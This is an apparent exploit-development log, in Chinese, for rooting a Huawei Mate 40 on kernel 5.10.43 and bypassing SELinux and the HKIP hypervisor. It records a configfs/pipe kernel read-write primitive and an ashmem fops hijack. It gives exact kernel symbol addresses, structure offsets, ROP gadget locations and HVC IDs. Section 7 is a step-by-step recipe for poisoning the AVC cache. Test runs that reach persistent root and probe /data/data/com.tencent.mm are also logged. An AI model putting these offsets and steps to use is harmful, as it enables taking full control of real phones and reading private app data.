# SELinux / AVC 结论存档（Mate 40 RS，NOP-AN01P，5.10.43）

记录时间：本会话。设备：`4EU0222111007420`。
本文件只记录**实测事实**、**静态反汇编事实**，以及明确标注的假设与未验证项。

---

## 一、结论摘要

1. 本机 **data-only 的 SELinux 绕过不可行**：所有已知的数据目标要么不存在，要么其页被 HKIP 在 EL2 保护——写入即 panic（实测）。
2. 唯一有 Mate 40 先例的可行路线是 TASZK 的**内核上下文 ROP** 调 `HKIP_HVC_RO_MOD_UNREGISTER`；而本镜像缺少他们所用的“从栈装参数”gadget（1450 万条指令全量反汇编核实）。
3. **AVC 缓存本身可读、结构已完全解出**（Klecko 也说它不在受保护池里），但受三重限制未能完成写入：
   - `CONFIG_HARDENED_USERCOPY=y`（读 slab 对象受限）；
   - configfs 原语的“劫持窗口”是地雷（见 §五）；
   - pipe 原语**依赖** configfs 伪造 `pipe_buffer`，一旦还原 fops 就失效（实测 oops）。
4. 已达成且可重复的部分：**uid=0 + 全部 capabilities 的 root**（su daemon 常驻），SELinux 仍 `u:r:shell:s0`。与母本天花板一致。

---

## 二、本机配置（`/proc/config.gz` 实测，非推测）

```
CONFIG_HKIP_SELINUX_PROT=y          ← SELinux 池 EL2 只读
CONFIG_HKIP_SELINUX_POLDB_SIZE_MB=8
CONFIG_HKIP_PRMEM=y
# CONFIG_HKIP_PRMEM_BYPASS is not set
CONFIG_HKIP_CFI_HARDEN=y
CONFIG_HKIP_MODULE_ALLOC=y
CONFIG_HKIP_XOM_CODE=y
# CONFIG_HKIP_PROTECT_CRED is not set  ← 凭据未被保护，故 cred 改写可行
CONFIG_HARDENED_USERCOPY=y
# CONFIG_HARDENED_USERCOPY_FALLBACK is not set
# CONFIG_SECURITY_SELINUX_DEVELOP is not set
# CONFIG_SECURITY_SELINUX_DISABLE is not set
CONFIG_SECURITY_SELINUX_CHECKREQPROT_VALUE=0
```

推论（与实测一致）：`enforcing` 字段不存在；`__randomize_layout` 在本构建里实际等价默认顺序（见 §三）。

---

## 三、静态反汇编事实（本镜像 `vmlinux_nop_2026.elf`）

### 3.1 `security_compute_av` @ `0xffffffc0109da654`

```
x21 = *(selinux_state + 0x50)                 ; state->policy (kvmalloc)
0x9da94c  ldrh w9,  [x21, #0x268]             ; policy->map.size      (u16)
0x9da968  ldr  x8,  [x21, #0x260]             ; policy->map.mapping   (ptr)
0x9da974  mov  w10, #0x88                     ; sizeof(struct selinux_mapping)
0x9da97c  ldrh w3,  [x8, tclass*0x88]         ; unmap_class() -> .value
0x9da98c  b.eq  <allow_unknown check>         ; 仅当该 value == 0
0x9dabe4  ldrb w8,  [x21, #0x254]             ; allow_unknown 位域所在字节
0x9dabe8  tbnz w8,  #1 -> 0x9da6e4            ; → avd->allowed = 0xffffffff
```

此外该函数开头（`0x9da6ac` 起）还有一条**本内核特有的判据**（见 §3.4）。

### 3.2 `avc_has_perm` @ `0xffffffc0109bf778`

```
ldr x0, [x24, #0x48]      ; state->avc（selinux_state+0x48）
bl  avc_lookup
ldr w8, [x0, #0x1c]       ; node->ae.avd.allowed
ldur x9, [x0, #0x14]      ; tsid/tclass 合并读
```

### 3.3 `avc_lookup` @ `0xffffffc0109bdff8` —— 5.10 的 AVC 布局（**与 5.15 不同**）

```
eor w10,w1,w2,lsl#2 ; eor w10,w10,w3,lsl#4 ; and w10,w10,#0x1ff   ; avc_hash
add x10, x0, w10,uxtw #3 ; add x10, x10, #0x8                      ; slots[] 在 avc+0x8
ldar x10, [x10]                                                    ; 槽里存的是 &node->list
sub  x0, x10, #0x28                                                ; node = entry - 0x28
ldr   w10, [x0]        ; ae.ssid         @ node+0x00
ldr   w10, [x0, #0x4]  ; ae.tsid         @ node+0x04
ldrh  w10, [x0, #0x8]  ; ae.tclass       @ node+0x08
add   x10, x0, #0x28   ; node->list.next（== *(entry)）
```

可得：

| 项 | 偏移 |
|---|---|
| `selinux_avc.avc_cache.slots[0]` | `avc + 0x8` |
| 槽内容 | `&node->list`（不是 node 基址） |
| `node` | `entry - 0x28` |
| `ae.ssid / tsid / tclass` | `+0x00 / +0x04 / +0x08` |
| `ae.avd.allowed / auditallow / auditdeny` | `+0x1c / +0x20 / +0x24` |
| `node->list.next` | `node+0x28`（即 `*(entry)`） |
| `AVC_CACHE_SLOTS` | 512（hash 掩码 `0x1ff` 佐证） |

> Klecko 文中 5.15 的写法是 `slot - 0x1c`；本内核必须用 `slot - 0x28` 且
> `allowed` 在 `node+0x1c`。照抄 5.15 的常量会走链错误。

### 3.4 本内核真实放行判据：`*(selinux_state + 8)` 的首字节

`security_compute_av` 开头：

```
ldr  x9, [x0, #0x8]        ; state+0x8 指针
cmn  x9, #1 ; b.eq  <WARN+BUG>          ; 指针合法性守卫
cmp  x9, 0xfffffffe87ff0000 ; b.lo <WARN+BUG>
...上限检查...
ldarb w9, [x9]             ; 取该对象首字节（atomic）
tbnz w9, #0               ; bit0=1 → 正常路径
mov  w8, #-1 ; str w8,[x19] ; b out     ; bit0=0 → avd->allowed = 0xffffffff
```

**实测**：`*(selinux_state+8) = 0xfffffffe87ff0ff8`，其首字节 `= 0x01`。

---

## 四、实测结果（逐条，均为本机运行）

| 目标 | 地址 | 动作 | 结果 |
|---|---|---|---|
| `selinux_state` 前 16 字节 | `.data` | configfs 读 | `00 00 00 00 | 00 00 00 00 | f8 0f ff 87 fe ff ff ff`，即 `*(+8)=0xfffffffe87ff0ff8` ✓ |
| `selinux_state.initialized`（推测在 +1） | `.data` | 读 | 已是 `0` → **本内核不是靠它放行** |
| `state->policy` | `.data` | configfs 读 | `0xfffffffeafff0d80`（vmalloc） |
| `policy->map.size` | vmalloc | configfs 读 | `95`（合理的类数量，佐证偏移正确） |
| `policy+0x254` / `policy+0x260` | vmalloc | **写** | **设备 panic**（EL2 只读，`HKIP_SELINUX_PROT=y`） |
| `0xfffffffe87ff0ff8` 首字节 | 固定区 | **写** | **设备 panic（3/3）**，该页同样受保护 |
| `state->avc` | `.bss` 静态 | configfs 读 | `0xffffffXX..39820`（低 20 位固定，随 KASLR 变） |
| `avc+0x8` 起 4096 字节（全部 slots） | `.bss` | **一次** configfs 读 | **成功**（`read=4096`） |
| 槽内节点 | kmalloc slab | pipe 读（窗口内） | **成功**：`ssid=1878/1988/…, tsid=457/237/…, allowed=00000000` |
| 槽内节点 | kmalloc slab | configfs 读（窗口内） | 死在第一处读 → 运行中断（**假设**：`HARDENED_USERCOPY` 对 slab 读的限制） |
| 节点写入 | kmalloc slab | pipe 写（**还原 fops 之后**） | **oops**：`pc=copy_page_to_iter+0x100`，`addr=0xffffffff1fdfffc0`（原因见 §五.2） |

---

## 五、两条必须记住的机制性约束

### 5.1 劫持窗口是地雷（B 类崩溃）

劫持 `ashmem_misc.fops` 期间，**任何**进程 `open("/dev/ashmem")` 都会拿到假 fops 表，
其 `asma+0x10`(page) 落在自己的名字串里 → `read()` 从字符串地址拷贝 → panic。
实测 oops：

```
Unable to handle kernel paging request at virtual address 0063615064656c6c   ("lledPac")
pc : __arch_copy_to_user+0xc0 ; lr : simple_read_from_buffer+0xbc
pid 3263 Comm: Thread-134        ← 与我们无关的进程
```

⇒ 窗口内能做多少事，直接决定成功率。**操作数越少越好**。

### 5.2 pipe 原语依赖 configfs（本轮最重要的发现）

`pipe_phys_read/write` 每次都要先用 **configfs 写**把一个伪造的 `pipe_buffer`
写进植入页，然后才 `read()/write()` 管道。
⇒ **还原 `ashmem_misc.fops` 之后，pipe 原语立即失效**；此时 `read()` 仍会用旧的
描述符去 `copy_page_to_iter`，从无效页读 → 实测 oops（地址 `0xffffffff1fdfffc0`）。

结论：**“先还原 fops、再用 pipe 做事”这个设计不成立**。

### 5.3 寻址：只能用 KASLR 镜像地址 + configfs

| 读法 | 实测 |
|---|---|
| `configfs` + `text_addr(sym)` | ✅ `init_task.comm` = `"swapper/"`；`policy`、`slots`、`selinux_state` 全部正确 |
| `pipe` + `data_addr(sym)` | ❌ 读到 `"success "` / `"g: [cpu7"` 之类字符串，或返回 0 |

即本机 **`P0_KERNEL_PHYS_LOAD = 0x40000000` 的物理别名假设不成立**，`data_addr()` 不可用于镜像符号。
（`util.c` 的 `p0_data_alias()` 见 `P0_KERNEL_PHYS_LOAD`/`P0_PHYS_OFFSET`。）

### 5.4 线性窗口上界（pipe 专用）

`is_direct_ptr()` 的上界 `0xffffff9000000000` 过宽。本机 `MemTotal 7.6GB`
⇒ 直接映射只到 `0xffffff8200000000`；`0xffffff88…` 属 vmalloc，喂给 pipe 会算出
非法 `struct page` 并在 `copy_page_to_iter` 中 fault（实测）。
AVC 走链时必须限制在 `[0xffffff8000001000, 0xffffff8200000000)`。

---

## 六、文献对照（结论差异的原因）

| 来源 | 设备/内核 | 与本机的差异 |
|---|---|---|
| TASZK《Don't Believe The Hype(rvisor)》 | Mate 40 / P40，2020–2021 内核 | 结论成立，但依赖**内核上下文 ROP** 调 `HKIP_HVC_RO_MOD_UNREGISTER`；本镜像缺少其“从栈装参数” gadget |
| Klecko《SELinux bypasses》 | Mate 20 Pro | Bypass 5 在**他那台**华为上有效；本机 `HKIP_SELINUX_PROT=y`，写 policy 直接 panic。他本人也写明：华为上 AVC 虽可写，但**不能重载策略**时“pretty much useless” |
| Impalabs HHEE 逆向 | P40 Pro | 机制说明一致（stage-2 保护 + HVC 接口） |
| 母本 README | nova6 5.10.43 | 同样止步于“hkip 保护 selinux，关不掉” |

---

## 七、未验证但留有先例的最后一条路（下次可直接照此做）

TASZK 原话：*"I first rewrote the AVC cache so the decisions will allow anything to
anybody (this is not protected memory)"* —— 即**不读节点、直接写**：

1. 先用一次被拒操作把目标元组写进缓存（`open("/data/data", O_RDONLY|O_DIRECTORY)`）；
2. configfs 读 `*(selinux_state+0x48)` → `avc`；
3. configfs 一次读 4096 字节得到 `slots[512]`（`avc+0x8`）；
4. 对每个满足 `entry ∈ [0xffffff8000001000, 0xffffff8200000000)` 的槽：
   `node = entry - 0x28`，configfs 写 `node+0x1c = 0xffffffff`（**不读节点**，避免 slab 读限制）；
5. 最后一次 configfs 写还原 `ashmem_misc.fops`；
6. 全部在窗口内完成；若写入触雷会 panic，需把条目数上限压到 8~24。

风险：写错条目 → panic；`allowed` 只对**已缓存**的元组生效，且会被 AVC 回收。

---

## 八、当前代码状态

- 工作树：`_work/ref/src_hwwlz/Eknight-…-0047e27`，构建 `295D376A…`（`preload.so`，153232 字节）。
- `fops.c::install_child_root()` 现在是**只读探测**：读 `selinux_state` 前 16 字节、
  读 `*(+8)` 处 4 字节、然后还原 fops。**写路径已用 `if (0 && …)` 禁用**，不会主动 panic。
- 相关宏在 `targets/nop_nop_an01p/target.h`：`SELINUX_POLICY_*`、`AVC_*`、
  `SELINUX_PROT_POOL*`、`HKIP_UNREGISTER_RO_MOD*`、`SWAPPER_PG_DIR_OFF`、`MEMSTART_ADDR_OFF`。

---

## 九、关键符号地址（KIMAGE 相对，`text_addr()` 后使用）

| 符号 | 地址 |
|---|---|
| `selinux_state` | `0xffffffc013ebb068`（off `0x03ebb068`） |
| `security_compute_av` | `0xffffffc0109da654` |
| `avc_lookup` | `0xffffffc0109bdff8` |
| `avc_has_perm` | `0xffffffc0109bf778` |
| `avc_alloc_node` | `0xffffffc0109bef20` |
| `avc_node_cachep` | `0xffffffc013ebb038` |
| `hkip_unregister_ro_mod` | `0xffffffc0122085b0`（内部 HVC id `0xC6001033`） |
| `hkip_register_ro_mod` | `0xffffffc01220636c`（`0xC6001032`） |
| `__hyp_set_vectors` | `0xffffffc010003de0`；`hvc #0; ret` 在 `+8` |
| `arm_cpuidle_suspend` 内 `blr x8` gadget | `0xffffffc0100a9a44` |
| `selinux_prot_pool` | `0xffffffc0136d0000`（+0x8 = pmalloc_list） |

---

## 十、后续复核与修正（2026-11-10，本条推翻 §3.2/§3.3 的 `allowed` 偏移）

### 10.1 `avd.allowed` 在 `node+0x0c`，不是 `+0x1c`

`avc_has_perm @ 0xffffffc0109bf778`：

```
9bf7ec  ldur x10,[x0,#0x0c]   ; avd 从 node+0x0c 开始
9bf7e8  ldur x9, [x0,#0x14]
9bf7f4  stp  x10,x9,[sp,#0x8]  ; 在栈上重建 avd，avd+0 = node+0x0c
9bf7f8  ldr  w8, [sp,#0x8]     ; w8 = avd->allowed
9bf7fc  bics wzr,w19,w8        ; 判定
9bf824  ldr  w8, [sp,#0xc]     ; auditallow = node+0x10
9bf874  ldr  w8, [sp,#0x10]    ; auditdeny  = node+0x14
```

`avc_compute_av @ 0xffffffc0109be224` 侧证：

```
9be298  ldr w24,[x25,#0xc]     ; x25 = avd → 取 avd+0x0c
9be304  ldr w2, [x19,#0x1810]  ; state->avc → avc_cache.latest_notif
9be308  cmp w2, w24            ; 策略序号比较 ⇒ 那一格是 seqno
```

⇒ 节点布局：`ssid 0x00 / tsid 0x04 / tclass 0x08 / **allowed 0x0c** /
auditallow 0x10 / **auditdeny 0x14** / seqno 0x18 / flags 0x1c / list 0x28`。
§3.2「`ldr w8,[x0,#0x1c] ; allowed`」把 seqno 当成了 allowed。

**副作用**：`node` 已由槽值 `-0x28` 校正，再加 `+0x1c` 会写到 `node-0x0c`（对象之外），
`check_heap_object` 直接拒 —— 这才是「AVC 写不进去」的真正原因，不是机制不通。

### 10.2 实测拦截文本（两次可复现）

```
usercopy: Kernel memory overwrite attempt detected to SLUB object 'nsproxy'
          (offset 12, size 4)!
kernel BUG at mm/usercopy.c:111!
```

`offset 12 = 0x0c`、`size 4` ⇒ 正是 `node + AVC_NODE_ALLOWED_OFF` 的 4 字节写。
**configfs 通道本身是好的**（§四 的 `read=4096` 没错），崩是因为把 nsproxy 当成了 avc_node。

### 10.3 校验必须与写入用同一个原语

用 pipe 读校验 + configfs 写，仍会写到 nsproxy：两者对同一 VA 的换算在本机不一致
（§5.3 已记录 pipe 侧 `data_addr()` 不可靠）。⇒ **节点校验与写入都走 `pipe_phys_*`**，
不经过 `copy_*_user`，`__check_object_size` 无从触发。

### 10.4 判据：`avc_lookup` 的哈希必须自洽

节点只会被链进 `slots[h]`，`h = (ssid ^ tsid<<2 ^ tclass<<4) & 0x1ff`
（`avc_lookup` 反汇编：`eor/eor/and #0x1ff`）。槽序号已知，故要求
`hash(hdr) == i`；随机对象命中概率约 1/512，仅靠范围检查则几乎必然误命中。

### 10.5 主链路可达性与观测（本轮 9 次实跑统计）

- `slide` → `KernelSnitch` → `skb plant/reclaim` → `pselect` → `cfi`
  → `pipe 原语`**全部打通过**（日志：`pselect ... success=1`、
  `phys step read64 done ok=1`、`cfi write selftest 4142434445464748`）。
- 但单轮成功率低，失败形态：
  1. `try_to_wake_up+0x68` NULL+8 ← `rt_mutex_adjust_prio_chain+0x12fc`
     （`ldr x0,[waiter,#0x30]; bl try_to_wake_up`，即 `waiter->task`
     指向植入页 `+0x3200` 的 fake task，而 `try_to_wake_up` 会读
     `*(p+0x9d0)` 再解引用 `+0x8` —— fake task 从不填 0x9d0 ⇒ 必 NULL）。
  2. `pselect entering` 后挂住/随后 panic。
  3. ashmem 劫持窗口地雷（无关进程 open `/dev/ashmem`，地址 `"lledPac"`）。
- **观测方法**：detached 启动后 `gl.log` 在 panic 重启后必丢；
  `tail -F` 在 Android toybox 不支持（立即 exit 1）；设备端 `mkfifo` 被 SELinux 拒。
  可用做法：`adb shell ... exec env LD_PRELOAD=...` 前台跑，主机侧后台作业接收输出，
  panic 时连接断开但已收到的日志保留（本轮三次完整日志均由此获得）。

### 10.6 单轮成功率实测（同一构建 `600F495B`，前 40 轮）

| 结果 | 次数 |
|---|---|
| punch 阶段 panic（设备重启） | 34 |
| pipe 阶段干净退出（`read_ok=0`，**不重启**） | 6 |
| 到达 AVC 阶段 | **0** |

开机静默时长的影响（同一构建、同一设备）：

| 启动时 uptime | 样本 | 到达 pipe/AVC/root |
|---|---|---|
| 25s | 6 | 0 |
| 120s | 3 | 0 |
| 300s | ~40 | 0（本轮） |
| 300s（更早、churn 较少时） | ~15 | 4 |

**结论**：本轮 exploit 的 AVC 段（`confirmed` 自证版）**从未被执行到**；
而 punch 之前的代码路径与曾成功的构建（`5549C858`、`9414CB0A`）在行为上无差异
（`fops.c` 的改动全部位于 punch 之后），因此 0/40 不是代码回归，而是
**环境漂移**——设备经过约 80 次 panic 重启后，punch 的成功率显著下降。
下次应先让设备静置或断电冷启，再用小批量（3~5 轮）验证，不要长跑。

### 10.7 AVC 投毒：**写入已证实，但不足以放行**（决定性负结果）

构建 `1DB9C366`，零轮询运行，一轮日志：

```
avc[dir] avc=ffffffec93939820 ar=8 sr=4096 map=95 nodes=283 wrote=283 confirmed=283 bad=0
   （连续 6 轮，confirmed 每轮都 == wrote：283/287/289/289/291/288）
avc result dir=/data/data/com.tencent.mm entry= open=-1      ← 该进程仍 uid 2000，卡在 DAC
embedded su execl --daemon exe=/data/local/tmp/su pid=32612 uid=0
```

随后用脱离启动再跑一轮，拿到常驻 root 后做访问测试：

```
[id]  uid=0(root) ... context=u:r:shell:s0
[ls /data/data]         ls: /data/data: Permission denied
[ls /data/data/com.tencent.mm]  Permission denied
```

**事实链**：
1. `confirmed == wrote` 证明 `allowed=0xffffffff` 确实写进了内核 AVC 节点（同一原语回读）；
2. 同一台机上 uid=0 的 `u:r:shell:s0` 进程**仍被拒**；
3. ⇒ **改写 AVC 决策掩码在本机不足以放行**，与 Klecko 对华为的判断
   （"pretty much useless"）以及 TASZK 链路必须再发 `HKIP_HVC_RO_MOD_UNREGISTER`
   才能改策略 一致。

**另外两条已确证的实现约束**：
- 节点写入**必须走 pipe**：configfs 走 `copy_from_user → check_heap_object`，一旦
  `node` 不是 SLUB 对象起点就 `kernel BUG at mm/usercopy.c:111`（实测两次：
  `SLUB object 'nsproxy' (offset 12, size 4)`），且与轮询无关；
- 槽数组 4KB 的 configfs 读、`state+0x48`/`0x50`/`policy+0x268` 的读均正常。

**下一步唯一已知可行方向**：TASZK 的内核上下文 ROP 发
`HKIP_HVC_RO_MOD_UNREGISTER(selinux_pool)`，而本镜像缺少其"从栈装参数"gadget
（14.08M 指令全扫描，shape A 命中 0），需要另找等价装载链。
